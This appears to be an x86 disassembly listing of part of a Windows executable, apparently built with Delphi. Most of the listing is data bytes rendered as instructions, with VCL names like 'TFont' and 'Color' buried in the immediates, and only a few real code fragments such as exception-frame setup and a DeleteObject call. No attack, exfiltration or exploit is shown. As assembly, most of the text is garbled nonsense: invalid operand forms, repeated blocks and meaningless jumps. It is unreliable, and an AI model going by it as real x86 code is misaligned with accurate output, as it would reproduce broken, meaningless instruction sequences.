add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
test [ fs : esi ] 0x4e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] cl
add [ eax ] al
test [ fs : esi ] 0x30
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
test [ fs : esi ] 0x35
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
test [ fs : esi ] 0x3d
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41a9e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9f0
retn
sub_41a9fc
add [ edx + 0x6010041 ] ch
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
pushad
stosb [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x56 ] ah
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edx + ebp * 4 + 0x41 ] di
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0041aa
add [ eax ] al
add ah ch
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
fsubr [ edx + 0xa030041 ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
popad
insd
nop
xor [ ebx + 0xc010041 ] ch
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
dec esp
stosd [ edi ]
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add al bl
stosb [ edi ]
inc ecx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax ] bl
lodsb [ esi ]
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
stosd [ edi ]
inc ecx
add [ ebx + 0x41abb4c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
dec eax
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x55 ] cl
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xab9cc08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x70041ab ] dh
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
les ebp [ ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xad
inc ecx
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41ac1c90
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax + 0x17 ] dh
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rcr al 0xac
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc ecx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
dec eax
stosd [ edi ]
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add ah dl
lodsb [ esi ]
inc ecx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41ab2090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop eax
aas
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi + 0x10041 ] al
std
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
inc [ edx + eax * 8 ]
inc ecx
add [ edi ] cl
push esp
inc edi
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
fsubr [ ecx + eax * 2 + 0x540b0300 ]
inc edx
jb r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ eax ] al
in al dx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
jo r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + eax * 8 - 0x53 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
outsb
je r-xdata
retn 0x41
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
lodsd [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbe53 ] ch
lodsd [ esi ]
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xacd8c08b
je r-xdata
lodsd [ esi ]
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x41 ] bh
add [ eax + 0x41ae ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x69ffbe52 ] cl
mov al [ 0x41ae ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ebx * 4 - 0x53 ] si
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
pushfd
lodsd [ esi ]
add [ eax + 0x180041ad ] dh
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
inc ecx
add ah ah
pop ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
lodsd [ esi ]
scasb [ edi ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
push eax
xchg esi eax
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
lodsd [ esi ]
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
adc al 0xc5
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ eax - 0x3b ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ch
imul esp [ ebx + 0x73 ] 0xc08b0000
popad
imul esp [ ebx + 0x73 ] 0x41ad9c90
sub_41afa4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xb0
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
scasd [ edi ]
inc ecx
add [ eax + eax ] bl
add [ eax ] al
push eax
lodsd [ esi ]
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
xor dl cl
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ eax - 0x36 ] bl
inc ecx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
add al 0xb0
inc ecx
add [ edi ] al
add al 0x54
push eax
outsb
in al dx
scasd [ edi ]
inc ecx
add al al
lodsd [ esi ]
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
test ah cl
inc ecx
add [ esp + ecx * 8 + 0x10041 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0xa9fc0004
inc ecx
add [ eax - 0x35 ] bh
inc ecx
add [ eax + 0x10041cb ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add eax [ eax ]
add eax 0x74646957
push 0xb0ecc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov al 0x41
add [ eax ] bl
add [ eax ] al
add [ eax - 0x53 ] dl
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
clc
int3
add [ ecx * 2 - 0x4f9a9b91 ] al
stosd [ edi ]
inc ecx
add [ esp + ecx * 8 + 0x41 ] dl
add [ esp + ecx * 8 + 0x41 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ esp + ecx * 8 - 0x3373ffbf ] al
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
lodsb [ esi ]
inc ecx
add [ eax ] bl
add [ eax ] al
inc [ eax - 0x34 ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
sub_41b0ea
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ eax ] ah
int 0x41
add [ esi ] al
push esp
inc edx
jb r-xdata
add [ eax ] al
jae r-xdata
xor al [ eax ]
and [ edx ] dh
inc eax
add [ eax + edx * 8 + 0x41 ] dh
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov cl 0x41
nop
add al 0xb1
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi - 0x287bffbf ] al
inc ecx
add [ eax - 0x29 ] dh
inc ecx
add [ esi + edx * 8 + 0x54070041 ] ah
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add al cl
mov cl 0x41
add [ eax ] bl
add [ eax ] al
jo r-xdata
jae r-xdata
add al 0x24
retn
outsd
pushfd
scasb [ edi ]
inc ecx
add [ eax + eax ] cl
add bh bh
mov cl 0x41
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
aam 0xb1
inc ecx
in al dx
mov al 0x41
add al al
lodsd [ esi ]
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
mov al 0x41
add [ eax ] dl
add [ eax ] al
[ eax - 0x2b ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
dec eax
aad 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
mov cl 0x41
add ah ah
pop ss
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
enter 0x41b1 0x0
pop eax
add [ eax ] al
add [ eax + 0x17 ] dh
imul esp [ ebx + 0x73 ] 0xa9fc0002
inc ecx
add [ eax - 0x32 ] bl
inc ecx
add [ eax - 0x32 ] ah
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0xb1000004
inc ecx
add [ eax + eax ] dl
add bh bh
aad 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
or [ edi + 0x72 ] al
popad
lodsb [ esi ]
inc ecx
add [ edi + ecx * 8 + 0x41 ] dh
add [ edi + ecx * 8 + 0x41 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
mov al 0xb1
inc ecx
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
sub_41b2ed
mov dl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b3 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffbe4d ] bl
mov bl 0x41
add [ eax ] ch
add [ eax ] al
add [ eax + 0x18 ] ah
inc ecx
add [ esp + esi + 0x41280040 ] dh
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop eax
aas
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add [ edi + edi + 0x41b80041 ] al
inc ecx
add al bl
jmp r-xdata
je r-xdata
jb r-xdata
inc eax
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ ecx ] al
add ch bh
mov bl 0x41
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x34 ] 0xe40041b3
sbb [ ecx ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
mov ah 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x47ffbe4c ] ch
mov ah 0x41
add [ eax + eax ] ch
add [ eax ] al
pushad
sbb [ ecx ] al
mov ah 0x34
inc eax
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
push esp
hlt
inc ecx
add al cl
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fld [ esi ]
mov ah 0x41
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41b488c0 ] cl
add [ edx ] bl
mov ah 0x41
aam 0x11
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffbe4c ] bl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov [ ecx + eax * 2 + 0x41b41a00 ] dh
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_41f6ec
sub_41b39c
cmp dh ch
inc ecx
add [ eax ] cl
push esp
inc edi
jb r-xdata
loope r-xdata
jo r-xdata
mov bl 0x41
add ah ah
inc ecx
add bh ch
mov bl 0x41
add cl bh
mov bl 0x41
add cl dl
mov bl 0x41
add cl bl
mov bl 0x41
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0xb3b00040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffbe4c ] bl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov [ ecx + eax * 2 + 0x41b41a00 ] dh
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_41f6ec
int 0xb8
jpe r-xdata
sbb [ ecx ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x34 ] 0xe40041b3
mov ah 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x47ffbe4c ] ch
mov ah 0x41
add [ eax + eax ] ch
add [ eax ] al
pushad
sbb [ ecx ] al
mov ah 0x34
inc eax
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
push esp
hlt
inc ecx
add al cl
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fld [ esi ]
mov ah 0x41
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41b488c0 ] cl
add [ edx ] bl
mov ah 0x41
aam 0x11
sub_41b5ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x41b6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] bl
inc ecx
add [ eax ] dh
add [ eax ] al
add al ch
mov dl 0x41
add [ esp + esi + 0x41280040 ] dh
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
mov eax 0x680041fa
inc eax
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add al ch
cli
inc ecx
add [ eax - 0x27ffbebf ] bh
jmp r-xdata
push 0x640041fd
add [ edx ] eax
sbb al 0x6
inc edx
add [ eax + 0x9004206 ] ah
push esp
dec ebp
je r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
imul bp [ ebp - 0x75 ] 0x68c0
mov dh 0x41
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ eax + 0x340041 ]
add [ eax ] al
call 0xffffffffb441fa0b
xor al 0x40
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
push 0x6800422e
inc eax
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add [ eax - 0x47ffbdd2 ] bl
inc ecx
inc ecx
add al bl
jmp r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
sbb al 0xb8
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov eax 0x180041
add [ eax ] al
call 0xffffffffb441f9b1
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
mov al 0xa
inc edx
add [ ebx + ecx ] cl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
xor al 0xb7
inc ecx
imul bp [ ebp - 0xc ] 0x41b5
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
mov eax 0x30004230
xor al [ edx ]
pop eax
xor al [ edx ]
insb
xor al [ edx ]
add eax 0x6f634954
outsb
mov eax eax
call 0x741faa1
add eax 0x6f634954
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b7 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x3c0041 ] ah
add [ eax ] al
call 0xffffffffb441f8c7
xor al 0x40
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pushfd
adc eax 0x40680042
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add al bl
adc eax 0x41b80042
inc ecx
add [ edi + edx + 0x182c0042 ] ch
inc edx
add [ esp + ebp * 8 + 0x1ae00041 ] dl
inc edx
add [ ebx + ebx + 0x1bd40042 ] dl
inc edx
add al ah
in eax dx
inc ecx
add [ eax ] dh
sbb al 0x42
add [ eax ] bl
inc edx
add [ eax ] bl
sub [ edx ] al
in al dx
sub [ edx ] al
enter 0x41ee 0x0
adc [ edx ] ch
inc edx
add [ edx + ebp + 0x42 ] ah
add [ edx - 0x121bffbe ] dh
inc ecx
add [ esi + ebp * 8 + 0x41 ] ch
add al bh
push ds
inc edx
add [ ebp + 0x1e740042 ] ah
inc edx
add [ ebp + 0x1b440042 ] ch
inc edx
add [ ebx + ebx + 0x26e00042 ] ah
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b7b070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b73470
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb6d40000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov dh 0x41
add [ eax + eax ] dh
add al ch
mov ah 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
out dx al
inc ecx
add ah bh
xor [ edx ] eax
inc ecx
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b607
add [ ebx + edi * 8 + 0x41 ] bh
add [ esp + ebp * 8 - 0x3f3ffbf ] dl
inc ecx
add [ esp + edi * 8 ] dl
inc ecx
add [ eax - 0x4 ] bh
inc ecx
add al ah
in eax dx
inc ecx
add [ edi * 8 - 0x21bffbf ] al
inc ecx
